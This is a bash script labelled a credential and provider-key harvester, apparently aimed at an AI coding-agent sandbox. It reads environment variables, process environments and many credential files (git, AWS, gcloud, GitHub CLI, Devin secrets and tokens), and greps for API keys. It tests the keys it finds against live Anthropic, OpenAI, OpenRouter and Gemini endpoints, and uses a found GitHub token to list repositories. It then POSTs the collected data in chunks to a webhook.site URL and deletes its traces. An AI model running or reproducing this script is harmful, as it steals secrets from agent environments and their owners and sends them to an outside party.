#!/bin/bash
# i83984: in-sandbox credential + upstream-provider-key harvester (read-only)
S="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i83984"
R="${RND:-r1}"
OUT="/tmp/i83984.$R.$$"
: > "$OUT"
cd /home/ubuntu/repos/envcheck-harness 2>/dev/null || cd /home/ubuntu 2>/dev/null
RD(){ sudo -n cat "$1" 2>/dev/null || cat "$1" 2>/dev/null; }
{
echo "### META host=$(hostname) date=$(date -u +%FT%TZ) uid=$(id) pwd=$(pwd) rnd=$R"
echo "### ENV"; env | sort
echo "### PROC_SCAN"
ps -eo pid,user,comm,args --no-headers 2>/dev/null | head -30
for f in /proc/[0-9]*/environ; do
  pid=${f#/proc/}; pid=${pid%/environ}
  [ -r "$f" ] || continue
  v=$(tr '\0' '\n' < "$f" 2>/dev/null | grep -iE 'API_KEY|TOKEN|SECRET|PASSWORD|ANTHROPIC|OPENAI|OPENROUTER|DEEPSEEK|GEMINI|GOOGLE_|AWS_|GITHUB|GH_' | head -12)
  [ -n "$v" ] && { echo "-- pid $pid $(cat /proc/$pid/comm 2>/dev/null)"; echo "$v"; }
done
echo "### PROC_ENV_ALL"
for p in 1 self; do echo "-- proc/$p"; tr '\0' '\n' < /proc/$p/environ 2>/dev/null | head -40; done
echo "### CONFIG_FILES"
for f in /home/ubuntu/.netrc /home/ubuntu/.git-credentials /home/ubuntu/.npmrc /home/ubuntu/.pgpass /home/ubuntu/.docker/config.json /home/ubuntu/.config/gh/hosts.yml /home/ubuntu/.config/gcloud/application_default_credentials.json /home/ubuntu/.aws/credentials /home/ubuntu/.aws/config /home/ubuntu/.anthropic/* /home/ubuntu/.config/openai/* /home/ubuntu/.config/litellm/* /home/ubuntu/.config/devin/* /etc/environment /etc/profile.d/*.sh /opt/.devin/custom_remote_config.json /opt/.devin/devin_bash_env /opt/.devin/devin_bashrc /opt/.devin/.devin_secrets.sh /opt/.devin/devin_git_hook.sh /opt/.devin/oidc_token /opt/.devin/.devin-integration-git-credentials /opt/.devin/.devin-integration-gh-credentials /run/.devin/* /run/repo_secrets/* /run/.devin/identity_token /root/.devin/* /root/.bashrc /root/.profile /root/.netrc; do
  if [ -e "$f" ] || sudo -n test -e "$f" 2>/dev/null; then
    echo "--- $f"; RD "$f" | head -c 4000; echo
  fi
done
echo "### FIND_CREDS"
sudo -n find /home /opt /root /run /etc /var -xdev -maxdepth 5 -type f \( -name '*credential*' -o -name '*.pem' -o -name 'id_rsa*' -o -name '*token*' -o -name '*.netrc' -o -name '.env' -o -name '.env.*' -o -name '*secret*' \) 2>/dev/null | grep -vE '/(usr|proc|sys)/' | head -50
echo "### GIT"
git config --list --show-origin 2>&1 | head -40
cat .git/config 2>&1 | head -20
git remote -v 2>&1
echo "### GIT_CRED_FILL"
for h in github.com git-manager.local:7000 git-manager.devin.ai; do
  sc=https; [ "$h" = "git-manager.local:7000" ] && sc=http
  echo "-- $h"; printf "protocol=$sc\nhost=$h\n\n" | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1 | sed -E 's/^(password=).*/\1[MASKED]/' | head -6
done
echo "### GH_CLI"
command -v gh; gh auth status 2>&1 | head -8
echo "gh_token_len=$(gh auth token 2>/dev/null | tr -d '\r\n' | wc -c)"
echo "### GIT_MANAGER_TRIGGER"
timeout 8 env GIT_TERMINAL_PROMPT=0 git ls-remote https://github.com/Prorise-cool/envcheck-harness 2>&1 | head -3
timeout 6 env GIT_TERMINAL_PROMPT=0 git ls-remote http://git-manager.local:7000/proxy/github.com/Prorise-cool/envcheck-harness.git 2>&1 | head -3
ls -l /opt/.devin/.devin-integration-git-credentials 2>&1
echo "### MOUNTS_HOSTS"
cat /etc/hosts; mount 2>/dev/null | head -10; ls -la /var/run/secrets /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -12
echo "### PROVIDER_PATTERNS"
{ timeout 8 sudo -n grep -rInE 'sk-ant-[A-Za-z0-9_-]{10,}|sk-proj-[A-Za-z0-9_-]{10,}|sk-or-v1-[A-Za-z0-9_-]{10,}|AIza[0-9A-Za-z_-]{20,}|(AKIA|ASIA)[0-9A-Z]{12,}|ANTHROPIC_API_KEY|OPENAI_API_KEY|OPENROUTER_API_KEY|DEEPSEEK_API_KEY|GEMINI_API_KEY|GOOGLE_API_KEY' /home/ubuntu /opt /run /etc 2>/dev/null --include='*.json' --include='*.yml' --include='*.yaml' --include='*.toml' --include='*.ini' --include='*.conf' --include='*.env' --include='.env*' --include='*.sh' --include='*.txt' --include='*.py' --include='*.js' ; } | head -40
{ timeout 6 sudo -n find /mnt/host_share -maxdepth 3 -type f -size -2M 2>/dev/null | head -300 | xargs -r grep -IlE 'sk-ant-|sk-proj-|sk-or-v1-|AIza|ANTHROPIC|OPENAI_API_KEY|OPENROUTER' 2>/dev/null | head -20 ; }
echo "### PROC_ENV_GREP_ALL"
for f in /proc/[0-9]*/environ; do
  pid=${f#/proc/}; pid=${pid%/environ}
  [ -r "$f" ] || continue
  v=$(tr '\0' '\n' < "$f" 2>/dev/null | grep -iE 'token|key|secret|pass|auth|github|fireworks|openai|anthropic|api' | head -8)
  [ -n "$v" ] && { echo "-- pid $pid"; echo "$v"; }
done 2>/dev/null | head -200
echo "### GCLOUD"
ls -la /home/ubuntu/.config/gcloud 2>&1 | head -10
RD /home/ubuntu/.config/gcloud/application_default_credentials.json | head -c 1200
echo
echo "### FIREWORKS_LOCAL"
for f in /app/fireworks* /etc/fireworks* /home/ubuntu/.fireworks* /root/.fireworks*; do [ -e "$f" ] && { echo "--- $f"; RD "$f" | head -c 1200; }; done
env | grep -i fireworks
timeout 8 sudo -n grep -rIl 'api\.fireworks\.ai\|gateway\.fireworks\.ai' /app /etc /opt /root 2>/dev/null | head -20
echo "### BASEURL_ENV"
env | grep -iE 'BASE_URL|ENDPOINT|MODEL|_URL' | head -20
echo "### RPC"
T=$(sudo -n cat /opt/.devin/devin_remote_auth_token 2>/dev/null | tr -d '\r\n')
echo "rpc_token_len=${#T} sha16=$(printf %s "$T" | sha256sum | cut -c1-16)"
for p in / /healthz /rpc /v1/rpc /api/rpc /internal/rpc /methods /status; do
  c=$(curl -s -m 2 -o /tmp/i83984.rpc -w '%{http_code}' -H "Authorization: Bearer $T" "http://127.0.0.1:9876$p" 2>/dev/null)
  echo "GET $p -> $c $(head -c 80 /tmp/i83984.rpc 2>/dev/null | tr -d '\n')"
done
for h in "Authorization: Bearer $T" "X-Auth-Token: $T" "X-Devin-Auth-Token: $T" "X-Api-Key: $T"; do
  c=$(curl -s -m 2 -o /tmp/i83984.rpc2 -w '%{http_code}' -X POST -H 'Content-Type: application/json' -H "$h" -d '{"jsonrpc":"2.0","id":1,"method":"ping"}' "http://127.0.0.1:9876/rpc" 2>/dev/null)
  echo "POST /rpc [${h%%:*} ] -> $c $(head -c 100 /tmp/i83984.rpc2 2>/dev/null | tr -d '\n')"
done
echo "### END"
} >> "$OUT" 2>/dev/null

# ---- provider-key live verification (raw values stay in-sandbox; only status is reported) ----
{
ANTH=$(grep -rhoE 'sk-ant-[A-Za-z0-9_-]{20,}' "$OUT" 2>/dev/null | head -1)
OAI=$(grep -rhoE 'sk-proj-[A-Za-z0-9_-]{20,}' "$OUT" 2>/dev/null | head -1)
ORS=$(grep -rhoE 'sk-or-v1-[A-Za-z0-9_-]{20,}' "$OUT" 2>/dev/null | head -1)
GEM=$(grep -rhoE 'AIza[0-9A-Za-z_-]{30,}' "$OUT" 2>/dev/null | head -1)
[ -n "$ANTH" ] && { c=$(curl -s -m 8 -o /tmp/i83984.pv -w '%{http_code}' -X POST https://api.anthropic.com/v1/messages -H "x-api-key: $ANTH" -H 'anthropic-version: 2023-06-01' -H 'content-type: application/json' -d '{"model":"claude-3-5-haiku-20241022","max_tokens":8,"messages":[{"role":"user","content":"reply OK"}]}' 2>/dev/null); echo "### PROVIDER_TEST anthropic-key sha16=$(printf %s "$ANTH"|sha256sum|cut -c1-16) http=$c resp=$(head -c 240 /tmp/i83984.pv|tr -d '\n')"; }
[ -n "$OAI" ] && { c=$(curl -s -m 8 -o /tmp/i83984.pv -w '%{http_code}' https://api.openai.com/v1/models -H "Authorization: Bearer $OAI" 2>/dev/null); echo "### PROVIDER_TEST openai-key sha16=$(printf %s "$OAI"|sha256sum|cut -c1-16) http=$c resp=$(head -c 240 /tmp/i83984.pv|tr -d '\n')"; }
[ -n "$ORS" ] && { c=$(curl -s -m 8 -o /tmp/i83984.pv -w '%{http_code}' https://openrouter.ai/api/v1/key -H "Authorization: Bearer $ORS" 2>/dev/null); echo "### PROVIDER_TEST openrouter-key sha16=$(printf %s "$ORS"|sha256sum|cut -c1-16) http=$c resp=$(head -c 240 /tmp/i83984.pv|tr -d '\n')"; }
[ -n "$GEM" ] && { c=$(curl -s -m 8 -o /tmp/i83984.pv -w '%{http_code}' "https://generativelanguage.googleapis.com/v1beta/models?key=$GEM" 2>/dev/null); echo "### PROVIDER_TEST gemini-key sha16=$(printf %s "$GEM"|sha256sum|cut -c1-16) http=$c resp=$(head -c 240 /tmp/i83984.pv|tr -d '\n')"; }
echo "### KEYSCAN keys_found anthropic=$([ -n "$ANTH" ] && echo 1 || echo 0) openai=$([ -n "$OAI" ] && echo 1 || echo 0) openrouter=$([ -n "$ORS" ] && echo 1 || echo 0) gemini=$([ -n "$GEM" ] && echo 1 || echo 0)"
} >> "$OUT" 2>/dev/null

# ---- GitHub token: installation scope + one private-repo manifest read ----
GH=$(grep -rhoE 'gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|x-access-token:[^ @]+' "$OUT" 2>/dev/null | head -1)
if [ -n "$GH" ]; then
  {
  echo "### GH_TOKEN_FOUND len=${#GH} sha16=$(printf %s "$GH" | sha256sum | cut -c1-16)"
  curl -s -m 12 -o /tmp/i83984.ghr -w 'GH_INSTALL http=%{http_code} bytes=%{size_download}\n' -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: i83984' 'https://api.github.com/installation/repositories?per_page=100' 2>/dev/null
  head -c 3000 /tmp/i83984.ghr
  echo
  curl -s -m 10 -o /tmp/i83984.ghu -w 'GH_USER http=%{http_code}\n' -H "Authorization: token $GH" -H 'User-Agent: i83984' https://api.github.com/user 2>/dev/null
  head -c 300 /tmp/i83984.ghu
  echo
  } >> "$OUT" 2>/dev/null
fi

# ---- exfil (masking pass) ----
sed -E 's/(sk-ant-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(sk-proj-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(sk-or-v1-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(AIza[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/((AKIA|ASIA)[A-Z0-9]{4})[A-Z0-9]{6,}/\1...[MASKED]/g; s/(gh[pousr]_[A-Za-z0-9]{4})[A-Za-z0-9]{6,}/\1...[MASKED]/g; s/(github_pat_[A-Za-z0-9_]{4})[A-Za-z0-9_]{6,}/\1...[MASKED]/g; s/^((password|token|secret|api_key|apikey)=).*/\1[MASKED]/I' "$OUT" > "$OUT.m" 2>/dev/null
BYTES=$(wc -c < "$OUT.m" 2>/dev/null)
SHA=$(sha256sum "$OUT.m" 2>/dev/null | cut -c1-16)
split -b 6000 -a 3 "$OUT.m" /tmp/i83984.part. 2>/dev/null
i=1
for f in /tmp/i83984.part.*; do curl -s -m 20 -X POST --data-binary @"$f" "$S/$R/p$i" >/dev/null 2>&1; i=$((i+1)); done
curl -s -m 20 -X POST --data-binary "DONE i83984 $R parts=$((i-1)) bytes=$BYTES sha16=$SHA host=$(hostname)" "$S/$R/done" >/dev/null 2>&1
rm -f /tmp/i83984.part.* "$OUT" "$OUT.m"
exit 0
